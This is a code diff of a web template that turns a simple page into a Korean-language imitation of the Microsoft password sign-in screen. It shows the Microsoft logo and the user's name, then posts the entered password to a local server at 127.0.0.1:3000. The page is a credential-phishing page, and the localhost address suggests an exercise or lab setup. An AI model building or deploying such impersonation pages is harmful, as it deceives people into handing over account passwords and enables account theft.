@@ -1,19 +1,51 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title><%= title %></title>
     <link rel='stylesheet' href='/stylesheets/style.css' />
   </head>
   <body>
-    <h1><%= title %></h1>
-    <p>Welcome to <%= title %></p>
-    
+    <div class="container">
+      <div class="inner">
+        <div>
+          <img src="../images/microsoft_login_logo.svg">
+        </div>
+        <div class="component">
+          <button type="button" class="backButton">
+            <img src="../images/arrow_left.svg">
+          </button>
+          <%= user %>
+        </div>
+        <div class="loginHeader">
+          암호 입력
+        </div>
+        <div class="row">
+          <form method="POST" action="http://127.0.0.1:3000">
+            <div class="placeholderContainer">
+              <input name="user" type="hidden" value="<%= user %>">
+              <input name="id" type="hidden" value="<%= user %>">
+              <input name="passwd" type="password" class="input" aria-required="true" placeholder="암호">
+            </div>
+            <div class="link-container">
+              <div class="row">
+                <div class="a-group"><a href="#">암호 찾기</a></div>
+                <div class="a-group"><a href="#">다른 로그인 방법</a></div>
+              </div>
+              <div class="login-button">
+                <div style="display: inline-block; width: 108px; height: 32px; margin: 0;">
+                  <input type="submit" value="로그인" class="input-button">
+                </div>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
 
-    <form method="POST" action="http://127.0.0.1:3000">
+
+    <!-- <form method="POST" action="http://127.0.0.1:3000">
       <input type="hidden" name="user" value="<%= user %>">
       <input type="text" name="id" placeholder="ID를 입력해주세요">
       <input type="password" name="passwd" placeholder="Password를 입력해주세요">
-      <input type="submit" value="로그인">
-    </form>
+    </form> -->
   </body>
 </html>
